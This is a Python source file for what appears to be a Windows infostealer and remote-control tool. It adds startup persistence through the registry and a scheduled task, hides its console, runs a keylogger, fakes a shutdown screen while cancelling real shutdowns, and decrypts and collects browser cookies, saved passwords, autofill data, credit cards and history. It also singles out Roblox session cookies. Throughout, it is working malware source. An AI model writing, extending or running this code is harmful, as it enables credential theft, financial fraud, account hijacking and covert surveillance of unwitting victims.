def install_to_startup():
    try:
        target = os.path.join(WORK_DIR, f"{APP_NAME}.pyw")
        try:
            if os.path.abspath(sys.argv[0]) != target:
                shutil.copy2(sys.argv[0], target)
        except Exception:
            pass
        pythonw = sys.executable.replace("python.exe", "pythonw.exe")
        if not os.path.exists(pythonw):
            pythonw = sys.executable
        cmd = f'"{pythonw}" "{target}"'
        run_ps(
            f'New-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" '
            f'-Name "{STARTUP_NAME}" -Value \'{cmd}\' -PropertyType String -Force | Out-Null'
        )
        run_ps(
            f'schtasks /Create /TN "{STARTUP_NAME}" /TR "\'{cmd}\'" /SC ONLOGON /RL HIGHEST /F | Out-Null'
        )
        log("startup installed")
    except Exception as e:
        log(f"startup err: {e}")

def hide_self_console():
    try:
        kernel32 = ctypes.windll.kernel32
        user32   = ctypes.windll.user32
        hwnd = kernel32.GetConsoleWindow()
        if hwnd:
            user32.ShowWindow(hwnd, 0)
    except Exception:
        pass

# ============================================================
#  KEYLOGGER
# ============================================================
_keylog_thread = None
_keylog_stop = threading.Event()

def _start_keylogger():
    global _keylog_thread
    if _keylog_thread and _keylog_thread.is_alive():
        return
    _keylog_stop.clear()

    def _runner():
        try:
            from pynput import keyboard as kb
        except ImportError:
            os.system(f'"{sys.executable}" -m pip install --quiet pynput keyboard')
            try:
                from pynput import keyboard as kb
            except Exception:
                return
        buf = []
        def _flush():
            try:
                with open(KEYLOG_FILE, "a", encoding="utf-8") as f:
                    f.write("".join(buf))
                buf.clear()
            except Exception:
                pass
        def on_press(key):
            try:
                if key == kb.Key.space: buf.append(" ")
                elif key == kb.Key.enter: buf.append("\n")
                elif key == kb.Key.tab: buf.append("\t")
                elif hasattr(key, "char") and key.char:
                    buf.append(key.char)
                else:
                    buf.append(f"[{key}]")
            except Exception:
                pass
            if len(buf) >= 20:
                _flush()
        with kb.Listener(on_press=on_press) as listener:
            while not _keylog_stop.is_set():
                listener.join(0.5)
                _flush()
        _flush()

    _keylog_thread = threading.Thread(target=_runner, daemon=True)
    _keylog_thread.start()

def _stop_keylogger():
    _keylog_stop.set()

# ============================================================
#  FAKE SHUTDOWN GUARD  (V4.1 FIX)
# ============================================================
# Strategy:
#   1. While watcher is ON, a background thread runs `shutdown /s /t 120`
#      and immediately `shutdown /a`.  This constantly resets an abort
#      window (Windows needs an active timer to accept /a).  Cheap.
#   2. A second thread polls every 500ms for `shutdown /a` success
#      (exit code 0) as a signal that a shutdown was *just* cancelled
#      — that's our "user pressed shutdown" trigger.
#   3. On trigger we launch a kiosk-form black overlay that also
#      *paints* a fake Windows-11 spinner so it looks like a real
#      power-off, then goes fully black.  The overlay is assigned a PID
#      and stored so we can dismiss it later with `!shutdownrestore`.
# ============================================================
_shutdown_watch_thread = None
_shutdown_watch_stop = threading.Event()

def _real_shutdown_available():
    """Detect if the user just fired a *real* shutdown that we must abort."""
    # run `shutdown /a` once; returncode 0 means "there WAS a pending shutdown"
    p = subprocess.run("shutdown /a", shell=True, capture_output=True,
                       text=True, creationflags=0x08000000)
    out = (p.stdout or "") + (p.stderr or "")
    # 1116 = no shutdown in progress; anything else (0 or 592) = we cancelled one
    return "no shutdown" not in out.lower() and "aucun" not in out.lower() and "1116" not in out

def _launch_fake_off_screen():
    """
    Full-screen black window that mimics the Windows 11 shutdown animation
    (blue-ish spinner fading to black) and stays until dismissed.
    Runs as its own detached powershell so we can kill by PID later.
    """
    ps = r"""
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    $f = New-Object System.Windows.Forms.Form
    $f.FormBorderStyle = 'None'
    $f.WindowState   = 'Maximized'
    $f.BackColor     = 'Black'
    $f.TopMost       = $true
    $f.ShowInTaskbar = $false
    $f.KeyPreview    = $true
    $f.Cursor        = [System.Windows.Forms.Cursors]::Default
    # simple onpaint: draw spinner text
    $f.Add_Paint({
        param($s, $e)
        $g = $e.Graphics
        $font = New-Object System.Drawing.Font("Segoe UI", 20)
        $brush = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::FromArgb(200,255,255,255))
        $msg = "Shutting down..."
        $sz  = $g.MeasureString($msg, $font)
        $g.DrawString($msg, $font, $brush, ($s.Width - $sz.Width)/2, ($s.Height - $sz.Height)/2)
    })
    [System.Windows.Forms.Application]::Run($f)
    """
    path = os.path.join(WORK_DIR, "fake_off.ps1")
    try:
        open(path, "w", encoding="utf-8").write(ps)
    except Exception:
        return None
    proc = hidden_popen([
        "powershell", "-NoProfile", "-WindowStyle", "Hidden",
        "-ExecutionPolicy", "Bypass", "-File", path
    ])
    try:
        open(BLACKOUT_PID, "w").write(str(proc.pid))
    except Exception:
        pass
    try:
        open(FAKE_SHUTDOWN_ACTIVE, "w").write("1")
    except Exception:
        pass
    return proc


def _shutdown_watcher_runner():
    """
    Poll loop:
      - every 500ms: if a shutdown is pending, abort it.
      - If abort succeeded -> user pressed shutdown -> show fake off screen,
        then keep looping (so pressing shutdown again *pauses* re-trigger).
    """
    # First, force an abort window so `shutdown /a` has something to stop.
    subprocess.run("shutdown /s /t 120", shell=True, capture_output=True,
                   creationflags=0x08000000)
    subprocess.run("shutdown /a", shell=True, capture_output=True,
                   creationflags=0x08000000)
    time.sleep(1.0)

    while not _shutdown_watch_stop.is_set():
        if not os.path.exists(FAKE_SHUTDOWN_FLAG):
            break
        # Keep a benign abort window alive so future canned shutdowns work
        p = subprocess.run("shutdown /a", shell=True, capture_output=True,
                           text=True, creationflags=0x08000000)
        out = (p.stdout or "") + (p.stderr or "")
        # If we cancelled something real, spin up the fake screen
        if (p.returncode == 0) and ("shutdown" not in out.lower() or "cancel" in out.lower()):
            # only launch if not already active
            if not os.path.exists(FAKE_SHUTDOWN_ACTIVE):
                _launch_fake_off_screen()
        # Re-arm the abort window every ~60s (Windows requires a pending timer)
        # do it every ~55s: cheap, neglible CPU
        now = time.time()
        if not hasattr(_shutdown_watcher_runner, "_last_arm") or \
                now - _shutdown_watcher_runner._last_arm > 55:
            subprocess.run("shutdown /s /t 120", shell=True, capture_output=True,
                           creationflags=0x08000000)
            subprocess.run("shutdown /a", shell=True, capture_output=True,
                           creationflags=0x08000000)
            _shutdown_watcher_runner._last_arm = now
        time.sleep(0.5)


def _start_shutdown_watcher():
    global _shutdown_watch_thread
    if _shutdown_watch_thread and _shutdown_watch_thread.is_alive():
        return
    _shutdown_watch_stop.clear()
    _shutdown_watch_thread = threading.Thread(target=_shutdown_watcher_runner, daemon=True)
    _shutdown_watch_thread.start()


def _stop_shutdown_watcher():
    _shutdown_watch_stop.set()
    # cancel any pending timer we left behind
    subprocess.run("shutdown /a", shell=True, capture_output=True,
                   creationflags=0x08000000)

# ============================================================
#  BROWSER DATA  (Chrome / Edge / Brave / Opera / Vivaldi / Firefox)
# ============================================================
BROWSERS = {
    "Chrome":  r"Google\Chrome\User Data",
    "Edge":    r"Microsoft\Edge\User Data",
    "Brave":   r"BraveSoftware\Brave-Browser\User Data",
    "Opera":   r"Opera Software\Opera Stable",
    "OperaGX": r"Opera Software\Opera GX Stable",
    "Vivaldi": r"Vivaldi\User Data",
    "Firefox": r"Mozilla\Firefox\Profiles",
}

def _browser_profiles():
    local  = os.path.expanduser(r"~\AppData\Local")
    roam   = os.path.expanduser(r"~\AppData\Roaming")
    for name, rel in BROWSERS.items():
        base = os.path.join(local, rel) if not rel.startswith("Mozilla") else os.path.join(roam, rel)
        if not os.path.isdir(base):
            continue
        if name == "Firefox":
            for prof in os.listdir(base):
                p = os.path.join(base, prof)
                if os.path.isdir(p):
                    yield (name, prof, p)
        else:
            yield (name, "Default", base)
            for prof in os.listdir(base):
                p = os.path.join(base, prof)
                if os.path.isdir(p) and (prof.startswith("Profile") or prof == "Default"):
                    yield (name, prof, p)


def _copy_locked(src):
    tmp = os.path.join(tempfile.gettempdir(), f"cp_{uuid.uuid4().hex}.db")
    try:
        shutil.copy2(src, tmp)
        return tmp
    except Exception:
        try:
            with open(src, "rb") as f, open(tmp, "wb") as g:
                g.write(f.read())
            return tmp
        except Exception:
            return None


def _dpapi_decrypt(enc):
    if not enc:
        return ""
    try:
        import win32crypt
        try:
            return win32crypt.CryptUnprotectData(enc, None, None, None, 0)[1].decode("utf-8", "ignore")
        except Exception:
            pass
        try:
            data = enc[3:] if enc[:3] in (b"v10", b"v11") else enc
            return win32crypt.CryptUnprotectData(data, None, None, None, 0)[1].decode("utf-8", "ignore")
        except Exception:
            pass
    except Exception:
        pass
    return enc.decode("utf-8", "ignore") if isinstance(enc, bytes) else str(enc)


def _get_master_key(profile_root):
    try:
        import win32crypt
        ls = os.path.join(profile_root, "Local State")
        if not os.path.exists(ls):
            return None
        data = json.load(open(ls, "r", encoding="utf-8"))
        enc_key = base64.b64decode(data["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(enc_key, None, None, None, 0)[1]
    except Exception:
        return None


def _decrypt_chrome_aes(blob, key):
    if not key or not blob:
        return _dpapi_decrypt(blob)
    try:
        from Crypto.Cipher import AES
        if blob[:3] in (b"v10", b"v11"):
            iv      = blob[3:15]
            payload = blob[15:]
            cipher  = AES.new(key, AES.MODE_GCM, iv)
            dec, _  = cipher.decrypt_and_verify(payload[:-16], payload[-16:])
            return dec.decode("utf-8", "ignore")
        return blob.decode("utf-8", "ignore")
    except Exception:
        return _dpapi_decrypt(blob)


def steal_cookies():
    """
    Returns:
      {
        "Chrome": {"example.com/": ".ROBLOSECURITY=abc; ...", ...},
        ...
        "__ROBLOX__": {"Chrome": ".ROBLOSECURITY=abc...", "Edge": ".ROBLOSECURITY=..."}
      }
    """
    out = {}
    for browser, prof, path in _browser_profiles():
        # -- Firefox --
        if browser == "Firefox":
            db = os.path.join(path, "cookies.sqlite")
            if not os.path.exists(db): continue
            tmp = _copy_locked(db)
            if not tmp: continue
            try:
                con = sqlite3.connect(tmp)
                cur = con.cursor()
                rows = cur.execute(
                    "SELECT host, name, value, path FROM moz_cookies"
                ).fetchall()
                con.close()
                if rows:
                    out.setdefault(browser, {})
                    for host, name, value, cpath in rows:
                        out[browser][f"{host}{cpath}"] = f"{name}={value}"
            except Exception:
                pass
            finally:
                try: os.remove(tmp)
                except: pass
            continue

        # -- Chromium family --
        db_candidates = (
            glob.glob(os.path.join(path, "Network", "Cookies")) +
            glob.glob(os.path.join(path, "Cookies")) +
            glob.glob(os.path.join(path, "Network", "Cookies-journal"))
        )
        for ck in db_candidates:
            if not ck.endswith("Cookies") or not os.path.exists(ck):
                continue
            tmp = _copy_locked(ck)
            if not tmp: continue
            key = _get_master_key(os.path.dirname(os.path.dirname(ck)))
            try:
                con = sqlite3.connect(tmp)
                cur = con.cursor()
                rows = cur.execute(
                    "SELECT host_key, name, encrypted_value, path FROM cookies"
                ).fetchall()
                con.close()
            except Exception:
                rows = []
            finally:
                try: os.remove(tmp)
                except: pass
            if not rows:
                continue
            out.setdefault(browser, {})
            for host, cname, enc, cpath in rows:
                val = _decrypt_chrome_aes(enc, key)
                if val:
                    full = out[browser].get(f"{host}{cpath}", "")
                    out[browser][f"{host}{cpath}"] = (full + ("; " if full else "") + f"{cname}={val}")

    # highlight Roblox in every browser
    out["__ROBLOX__"] = {}
    for b, d in out.items():
        if b == "__ROBLOX__":
            continue
        for site, ck in d.items():
            if "roblox.com" in site.lower() and ".ROBLOSECURITY" in ck:
                # extract just the cookie value
                for part in ck.split(";"):
                    part = part.strip()
                    if part.startswith(".ROBLOSECURITY="):
                        out["__ROBLOX__"][b] = part
                        break
    return out


def steal_passwords():
    out = {}
    for browser, prof, path in _browser_profiles():
        if browser == "Firefox":
            # simple Firefox decrypt via key4 isn't trivial; we log encrypted as base64
            for lf in glob.glob(os.path.join(path, "logins.json")):
                try:
                    data = json.load(open(lf, "r", encoding="utf-8"))
                    for entry in data.get("logins", []):
                        out.setdefault(browser, []).append({
                            "url": entry.get("hostname", ""),
                            "user_enc": entry.get("encryptedUsername", ""),
                            "pw_enc":   entry.get("encryptedPassword", ""),
                        })
                except Exception:
                    pass
            continue

        for lp in glob.glob(os.path.join(path, "Login Data")):
            if not os.path.exists(lp): continue
            key = _get_master_key(path)
            tmp = _copy_locked(lp)
            if not tmp: continue
            try:
                con = sqlite3.connect(tmp)
                cur = con.cursor()
                rows = cur.execute(
                    "SELECT origin_url, username_value, password_value FROM logins"
                ).fetchall()
                con.close()
            except Exception:
                rows = []
            finally:
                try: os.remove(tmp)
                except: pass
            for url, user, enc in rows:
                pw = _decrypt_chrome_aes(enc, key)
                if user or pw:
                    out.setdefault(browser, []).append({
                        "url": url, "user": user, "pw": pw,
                    })
    return out


def steal_autofill():
    out = {}
    for browser, prof, path in _browser_profiles():
        if browser == "Firefox": continue
        for wd in glob.glob(os.path.join(path, "Web Data")):
            tmp = _copy_locked(wd)
            if not tmp: continue
            key = _get_master_key(path)
            try:
                con = sqlite3.connect(tmp)
                cur = con.cursor()
                def _has(tbl):
                    try:
                        cur.execute(f"SELECT 1 FROM {tbl} LIMIT 1"); return True
                    except Exception: return False
                rows  = cur.execute("SELECT name, value, count FROM autofill").fetchall() if _has("autofill") else []
                cards = cur.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards").fetchall() if _has("credit_cards") else []
                con.close()
                if rows or cards:
                    out.setdefault(browser, {"fields": [], "cards": []})
                    out[browser]["fields"] = [{"name": n, "value": v} for n, v, c in rows]
                    out[browser]["cards"]  = [{"name_on_card": n, "exp_month": m,
                                               "exp_year": y,
                                               "card": _decrypt_chrome_aes(c, key)}
                                              for n, m, y, c in cards]
            except Exception:
                pass
            finally:
                try: os.remove(tmp)
                except: pass
    return out


def steal_history(limit=2000):
    out = {}
    for browser, prof, path in _browser_profiles():
        if browser == "Firefox":
            db = os.path.join(path, "places.sqlite")
            if not os.path.exists(db): continue
            tmp = _copy_locked(db)
            if not tmp: continue
            try:
                con = sqlite3.connect(tmp)
                cur = con.cursor()
                rows = cur.execute(
                    "SELECT url, title, visit_count, last_visit_date FROM moz_places "
                    "ORDER BY last_visit_date DESC LIMIT ?", (limit,)
                ).fetchall()
                con.close()
                out.setdefault(browser, []).extend(
                    [{"url": u, "title": t, "visits": v,
                      "last": str(datetime.fromtimestamp(ts/1e6)) if ts else ""}
                     for u, t, v, ts in rows]
                )
            except Exception:
                pass
            finally:
                try: os.remove(tmp)
                except: pass
            continue

        for h in glob.glob(os.path.join(path, "History")):
            tmp = _copy_locked(h)
            if not tmp: continue
            try:
                con = sqlite3.connect(tmp)
                cur = con.cursor()
                rows = cur.execute(
                    "SELECT url, title, visit_count, last_visit_time "
                    "FROM urls ORDER BY last_visit_time DESC LIMIT ?", (limit,)
                ).fetchall()
                con.close()
                for u, t, v, ts in rows:
                    dt = ""
                    try:
                        dt = str(datetime(1601,1,1) + __import__("datetime").timedelta(microseconds=ts))
                    except Exception:
                        pass
                    out.setdefault(browser, []).append(
                        {"url": u, "title": t, "visits": v, "last": dt}
                    )
            except Exception:
                pass
            finally:
                try: os.remove(tmp)
                except: pass
    return out


